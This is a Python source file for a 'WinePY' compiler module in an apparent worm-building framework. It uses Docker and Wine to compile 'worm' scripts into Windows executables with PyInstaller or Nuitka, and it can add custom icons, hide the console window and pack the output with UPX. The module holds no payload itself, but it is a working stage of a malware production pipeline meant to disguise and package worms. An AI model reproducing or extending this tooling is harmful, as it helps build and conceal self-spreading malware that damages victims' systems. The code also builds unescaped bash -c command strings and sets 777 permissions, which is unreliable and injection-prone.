import docker
import os
from time import sleep
from typing import Union

from app.hive.etc.py_lib import PY_LIBRARY

class WinePY:
    def __init__(self, master: object):
        self.master = master
        self.msg = self.master.queen.msg
        self.name = "WinePY"
        self.dir_hive = self.master.queen.dir_hive_out
        self.dir_work = "/hive"
        self.dir_etc = os.path.join(os.path.dirname(__file__), "etc")
        self.dir_lab_lib = "/library"
        self.dir_lab = "/lab"

        self.master_system_compiler = "littleatarixe/wine_py:1.0"
        self.compiler_container_name = "wine_py"
        self.docker = docker.from_env()
        self._container_id = None

        self._win = True
        self._linux = False
    

    @property
    def status(self) -> bool:
        return self.get_compiler()
    
    @property
    def compiler(self) -> Union[object, None]:
        return self.get_compiler(True)
    
    def check_master_system(self) -> bool:
        try:
            container = self.docker.images.get(self.master_system_compiler)
            return True
        except docker.errors.ImageNotFound:
            return False
    
    def create_container(self) -> object:
        comp = self.docker.containers.create(
            image=self.master_system_compiler,
            command="sleep infinity",
            name=self.compiler_container_name,
            volumes={
                self.dir_hive : {"bind" : self.dir_work, "mode" : "rw"},
                self.dir_etc : {"bind" : self.dir_lab_lib, "moder" : "rw"}
            },
            detach=True
        )
        return comp
    
    def pull_image_with_progress(self, image_name):
        pull_output = self.docker.api.pull(image_name, stream=True, decode=True)
        for line in pull_output:
            if 'status' in line:
                self.msg("msg", f"Status: {line['status']}", sender=self.name)
            if 'progress' in line:
                self.msg("msg", f"Progress: {line['progress']}", sender=self.name)
            if 'id' in line:
                self.msg("msg", f"ID: {line['id']} - {line['status']} {line.get('progress', '')}", sender=self.name)
        self.msg("msg", "Downloading Complete", sender=self.name)
    
    def get_compiler(self, check: bool = False) -> Union[None, object]:
        if not self.check_master_system():
            self.msg("error", f"[!!] ERROR '{self.name}': No master system compiler image downloaded. Install the necessary modules. [!!]", sender=self.name)
            return None
        if self._container_id:
            return self.docker.containers.get(self._container_id)
        
        for con in self.docker.containers.list(all=True):
            if con.name == self.compiler_container_name:
                self._container_id = con.id
                comp = self.docker.containers.get(self._container_id)
                return comp

        if not check:
            return None
        return self.create_container()
    
    def exec_cmd(self, command: str) -> object:
        exec_id = self.docker.api.exec_create(self.compiler.id, f"bash -c '{command}'")
        output = self.docker.api.exec_start(exec_id, stream=True)
        for line in output:
            self.msg("msg", line.decode().strip(), sender=self.name)
    
    def exe_command(self, command: str) -> str:
        self.start_exec_compiler()
        exec_id = self.docker.api.exec_create(self.compiler.id, f"bash -c '{command}'")
        output = self.docker.api.exec_start(exec_id, stream=False)
        self.compiler.stop()
        return output.decode("utf-8")
    
    def install(self) -> None:
        if self.status:
            self.msg("msg", f"Core: '{self.name}' is installed", sender=self.name)
            return
        self.msg("msg", "Start image downloads. This may take some time.", sender=self.name)
        sleep(1)
        self.pull_image_with_progress(self.master_system_compiler)
        self.msg("msg", "Get image...", sender=self.name)
        if not self.compiler:
            self.msg("error", f"[!!] ERROR '{self.name}': building compiler [!!]", sender=self.name)
            return
        self.install_modules()
    
    def install_modules(self) -> None:
        if not self.compiler:
            self.msg("error", "[!!] ERROR: Compiler is not installed [!!]", sender=self.name)
            return
        self.msg("msg", f"Start Compiler: {self.name}")
        self.compiler.start()
        sleep(0.5)
        self.msg("msg", "------ Install Modules ------", sender=self.name)
        self.msg("msg", ", ".join(PY_LIBRARY), sender=self.name)
        for mod in PY_LIBRARY:
            self.exec_cmd(f"wine python -m pip install {mod}")
        self.msg("msg", "DONE", sender=self.name)
        self.msg("msg", "Stopping Compiler ......")
        self.compiler.stop()
    
    def start_exec_compiler(self) -> None:
        if not self.compiler:
            self.msg("error", "[!!] ERROR: I cannot compile the worm. Module missing. [!!]")
            return
        self.msg("msg", f"Start Compiler: {self.name}")
        self.compiler.start()
    

    def compile_worm(self, worm_pipeline: object) -> object:
        if not self.compiler:
            self.msg("error", "[!!] ERROR: I cannot compile the worm. Module missing. [!!]")
            return worm_pipeline
        comp = worm_pipeline.gvar.get("COMPILER_NAME")
        if worm_pipeline.pre_compile:
            match comp:
                case "WinePyInst":
                    worm_pipeline = self.pyinstall_script_compile(worm_pipeline)
                case _:
                    self.msg("error" , f"[!!] ERROR: No compile script for '{comp}'. [!!]", sender=self.name)
        else:
            match comp:
                case "WinePyInst":
                    worm_pipeline = self.pyinstall_compile(worm_pipeline)
                case "WinePyNuitka":
                    worm_pipeline = self.nuitka_compile(worm_pipeline)
 
        return worm_pipeline
    
    def use_upx(self, worm_name: str, options: dict = {}) -> str:
        return f"wine upx --lzma --force {worm_name}"
    
    def pyinstall_script_compile(self, worm_pipeline: object) -> object:
        self.msg("msg", "Compile from script", sender=self.name)
        self.start_exec_compiler()
        cmd = f"wine pyinstaller {worm_pipeline.comp_script_name}"
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_pipeline.worm_name} && {cmd}")
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_pipeline.worm_name} && chmod 777 *")
        self.exec_cmd(f"cp {self.dir_work}/{worm_pipeline.worm_name}/dist/{worm_pipeline.worm_name}.exe {self.dir_work}/{worm_pipeline.worm_name}/{worm_pipeline.worm_name}.exe")
        self.exec_cmd(f"chmod 777 {self.dir_work}/{worm_pipeline.worm_name}/{worm_pipeline.worm_name}.exe")
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_pipeline.worm_name} && rm -R build/")
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_pipeline.worm_name} && rm -R dist/")
        if worm_pipeline.gvar.get("USE_UPX"):
            upx_cmd = self.use_upx(f"{worm_pipeline.worm_name}.exe")
            self.exec_cmd(f"cd {self.dir_work} && cd {worm_pipeline.worm_name} && {upx_cmd}")
        self.msg("msg", "Compile Done", sender=self.name)
        worm_pipeline.exe_file_name = f"{worm_pipeline.worm_name}.exe"
        worm_pipeline.exe_file_path = os.path.join(worm_pipeline.work_dir, worm_pipeline.exe_file_name)
        return worm_pipeline

    
    def pyinstall_compile(self, worm_pipeline: object) -> object:
        self.start_exec_compiler()
        cmd = "wine pyinstaller --onefile"
        match worm_pipeline.gvar["PROGRAM_TYPE"]:
            case "console":
                cmd += " --console"
            case "window":
                cmd += " --windowed"
        if worm_pipeline.gvar.get("ICON"):
            cmd += f" --icon={worm_pipeline.icon_name}"
        worm_name = worm_pipeline.worm_name
        code_fname = worm_pipeline.file_name
        upx = worm_pipeline.gvar.get("USE_UPX")
        
        cmd += f" --name={worm_name} {code_fname}"
        self.msg("msg", f"CMD: {cmd}", sender=self.name)
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_name} && {cmd}")
        self.msg("msg", "Compile Done", sender=self.name)
        self.exec_cmd(f"cp {self.dir_work}/{worm_name}/dist/{worm_name}.exe {self.dir_work}/{worm_name}/{worm_name}.exe")
        self.exec_cmd(f"chmod 777 {self.dir_work}/{worm_name}/{worm_name}.exe")
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_name} && rm -R build/")
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_name} && rm -R dist/")
        if upx:
            upx_cmd = self.use_upx(f"{worm_name}.exe")
            self.exec_cmd(f"cd {self.dir_work} && cd {worm_name} && {upx_cmd}")
        self.exec_cmd(f"chmod 777 {self.dir_work}/{worm_name}/{worm_name}.exe")
        self.msg("msg", "Stopping Compiler ......")
        self.compiler.stop()
        worm_pipeline.exe_file_name = f"{worm_name}.exe"
        worm_pipeline.exe_file_path = os.path.join(worm_pipeline.work_dir, worm_pipeline.exe_file_name)
        return worm_pipeline
        
        
    def nuitka_compile(self, worm_pipeline: object) -> object:
        self.start_exec_compiler()
        cmd = "wine python -m nuitka --onefile --mingw64"
        if worm_pipeline.gvar.get("ICON"):
            cmd += f" --windows-icon-from-ico={worm_pipeline.icon_name}"
        worm_name = worm_pipeline.worm_name
        code_fname = worm_pipeline.file_name
        upx = worm_pipeline.gvar.get("USE_UPX")
        match worm_pipeline.gvar["PROGRAM_TYPE"]:
            case "window":
                cmd += " --windows-disable-console"
        cmd += f" {code_fname}"
        self.msg("msg", f"CMD: {cmd}", sender=self.name)
        self.exec_cmd(f"cd {self.dir_work} && cd {worm_name} && {cmd}")
        self.msg("msg", "Compile Done", sender=self.name)
        self.msg("msg", "removing files....", sender=self.name)
        # self.exec_cmd(f"chmod 777 {self.dir_work}/{worm_name}/{worm_name}.exe")
        self.exec_cmd(f"cd {self.dir_work}/{worm_name} && rm -R {worm_name}.build")
        self.exec_cmd(f"cd {self.dir_work}/{worm_name} && rm -R {worm_name}.dist")
        self.exec_cmd(f"cd {self.dir_work}/{worm_name} && rm -R {worm_name}.onefile-build")
        if upx:
            upx_cmd = self.use_upx(f"{worm_name}.exe")
            self.exec_cmd(f"cd {self.dir_work} && cd {worm_name} && {upx_cmd}")
        self.exec_cmd(f"chmod 777 {self.dir_work}/{worm_name}/{worm_name}.exe")
        self.msg("msg", "Stopping Compiler ......")
        self.compiler.stop()
        worm_pipeline.exe_file_name = f"{worm_name}.exe"
        worm_pipeline.exe_file_path = os.path.join(worm_pipeline.work_dir, worm_pipeline.exe_file_name)
        return worm_pipeline

   
        